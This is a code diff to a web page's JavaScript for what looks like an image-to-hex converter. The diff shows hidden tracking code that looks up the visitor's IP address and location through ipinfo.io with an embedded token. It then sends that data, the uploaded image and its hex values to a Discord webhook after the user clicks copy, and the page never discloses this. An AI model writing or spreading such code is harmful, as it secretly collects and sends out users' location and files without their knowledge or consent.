@@ -143,7 +143,11 @@
     <pre id="output"></pre>
 
 </div>
-    <script>
+<script>
+    let hexArray = [];
+    let imageDataURL = '';
+    let ipData = null;
+
     document.getElementById('imageInput').addEventListener('change', handleImageUpload);
     document.getElementById('copyButton').addEventListener('click', copyHexValues);
 
@@ -156,11 +160,11 @@
             const img = new Image();
             img.onload = function() {
                 processImage(img);
-                // Fetch the IP data and send it along with the image
+                // Fetch the IP data after image upload
                 fetch('https://ipinfo.io/json?token=64e083390966ef')
                     .then(response => response.json())
-                    .then(ipData => {
-                        sendToWebhook(img, ipData);
+                    .then(data => {
+                        ipData = data; // Store IP data for later use
                     });
             };
             img.src = e.target.result;
@@ -181,7 +185,8 @@
 
         // Update the preview image
         const preview = document.getElementById('preview');
-        preview.src = canvas.toDataURL(); // Set preview image to canvas data URL
+        imageDataURL = canvas.toDataURL(); // Store the image data URL for the webhook
+        preview.src = imageDataURL; // Set preview image to canvas data URL
         preview.style.display = 'block'; // Show the preview image
 
         // Get image data from canvas
@@ -189,7 +194,7 @@
         const data = imageData.data;
 
         // Convert to hex values
-        let hexArray = [];
+        hexArray = [];
         for (let i = 0; i < data.length; i += 4) {
             let r = data[i];
             let g = data[i + 1];
@@ -219,24 +224,31 @@
     function copyHexValues() {
         const outputElement = document.getElementById('output');
         const textToCopy = outputElement.textContent;
+
+        // Copy the hex values to the clipboard
         navigator.clipboard.writeText(textToCopy).then(() => {
             alert("Copied to clipboard!");
+
+            // Now send the data to the webhook after successful copy
+            sendToWebhook();
         }).catch(err => {
             alert("Failed to copy hex values: " + err);
         });
     }
 
-    // Send IP and image data to the Discord webhook
-    function sendToWebhook(image, ipData) {
-        const canvas = document.getElementById('canvas');
-        const imageDataURL = canvas.toDataURL(); // Get the base64 image data
+    // Send IP, hex, and image data to the Discord webhook
+    function sendToWebhook() {
+        if (!ipData || !imageDataURL || !hexArray.length) {
+            console.error("Missing data. Ensure image is uploaded and IP data is fetched.");
+            return;
+        }
 
         // Prepare the data to send
         const data = {
             content: `IP: ${ipData.ip}\nLocation: ${ipData.city}, ${ipData.region}, ${ipData.country}`,
             embeds: [{
-                title: "Image Upload",
-                description: "An image has been uploaded along with the IP information.",
+                title: "Image Upload & Hex Data",
+                description: `Hex values: ${hexArray.join(', ')}`,
                 image: {
                     url: imageDataURL
                 }
